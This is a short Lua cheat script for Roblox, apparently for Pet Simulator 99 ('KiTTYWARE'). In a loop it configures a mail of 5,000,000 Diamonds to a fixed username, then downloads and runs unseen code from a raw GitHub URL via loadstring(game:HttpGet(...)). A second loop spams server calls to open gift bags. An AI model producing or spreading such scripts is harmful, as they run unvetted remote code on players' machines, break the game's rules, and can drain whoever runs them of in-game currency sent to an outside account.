
_G.loop = true
_G.loopDelay = 25
while _G.loop do
getgenv().KiTTYWARE = {
    autoPrepare = {
        Usernames = {

"sorayuu112",



            
        },
        mailConfig = {
            --{Class = "Pet", Name = "Alien Parasite", Tier = 2, Shiny = false, Amount = 40},
            --{Class = "Potion", Name = "Coins", Tier = 5, Shiny = false, Amount = 6},
            --{Class = "Enchant", Name = "Coins", Tier = 5, Shiny = false, Amount = 2},
            {Class = "Currency", Name = "Diamonds", Tier = nil, Shiny = false, Amount = 5000000},
            --{Class = "Item", Name = "Gift Bag", Tier = nil, Shiny = false, Amount = 3000},
            --{Class = "Item", Name = "Large Gift Bag", Tier = nil, Shiny = false, Amount = 3000},
            --{Class = "Item", Name = "Charm Stone", Tier = nil, Shiny = false, Amount = 1000},
        },
    }
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/xnazov/KITTYWARE_PS99/main/autoPrepare"))()
task.wait(loopDelay)
end




    _G.autoOpen = true
_G.openDelay = 0.5

local Network = game.ReplicatedStorage.Network
local Items = {"Gift Bag", "Large Gift Bag", "Charm Stone"}

function autoOpen(name)
    Network.GiftBag_Open:InvokeServer(name)
end

while _G.autoOpen do task.wait(_G.openDelay)
    for i,v in pairs(Items) do
        autoOpen(v)
    end
end
